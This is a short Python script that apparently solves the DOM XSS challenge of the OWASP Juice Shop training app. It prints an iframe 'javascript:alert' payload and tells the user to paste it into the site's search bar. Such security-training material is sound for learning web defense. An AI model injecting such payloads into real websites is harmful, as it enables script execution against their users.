import os
import requests

def main():
    juice_shop_ip = os.environ.get('OWASP_JUICE_SHOP_IP_ADDRESS', 'localhost')
    juice_shop_port = os.environ.get('OWASP_JUICE_SHOP_PORT', '3000')
    
    base_url = f"http://{juice_shop_ip}:{juice_shop_port}"
    
    payload = "<iframe src=\"javascript:alert('xss')\">"
    
    print(f"[+] Payload DOM XSS: {payload}")
    print(f"[!] Paste this payload into the search bar on {base_url}")
    
    print("[✅] Challenge DOM XSS should be solvable!")

if __name__ == "__main__":
    main()
